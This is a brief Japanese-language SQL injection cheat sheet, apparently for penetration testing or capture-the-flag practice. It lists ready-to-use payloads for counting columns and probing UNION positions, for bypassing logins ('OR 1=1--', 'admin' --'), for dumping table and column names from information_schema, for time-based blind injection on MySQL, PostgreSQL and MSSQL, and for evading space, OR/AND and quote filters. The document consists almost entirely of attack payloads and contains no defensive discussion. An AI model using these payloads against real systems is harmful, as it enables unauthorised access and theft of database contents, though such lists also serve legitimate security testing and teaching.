### 1. 調査・特定

#### データベースの種類やカラム数の特定

`' ORDER BY 1--`

`' ORDER BY 2--`

`' ORDER BY 3--`

#### データの表示位置の特定

どのカラムに自分の入力が表示されるかを確認


`' UNION SELECT 1,2,3--`



### 2. 認証回避


`' OR 1=1--`

`admin' --`

`' OR '1'='1`

`" OR "1"="1`

`admin' #`


### 3. 情報抽出

バージョン,DB名,ユーザー名の抽出はSQLの種類によって変わるので調査して対応


#### 全テーブル名の表示
`' UNION SELECT 1,table_name FROM information_schema.tables--`

#### 特定テーブルのカラム名表示
`' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'--`

### 4. ブラインドSQLi（Blind SQLi）

#### MySQL: 5秒待機
`' AND SLEEP(5)--`

#### PostgreSQL: 5秒待機
`' AND pg_sleep(5)--`

#### MSSQL: 5秒待機
`' WAITFOR DELAY '0:0:5'--`


### 5. 特殊なフィルター回避

#### スペース禁止:
 `'UNION/**/SELECT/**/1,2,3--`

#### OR/AND禁止
|| や && を使用

#### クォーテーション禁止

0x61646d696e (16進数で 'admin' を表現)
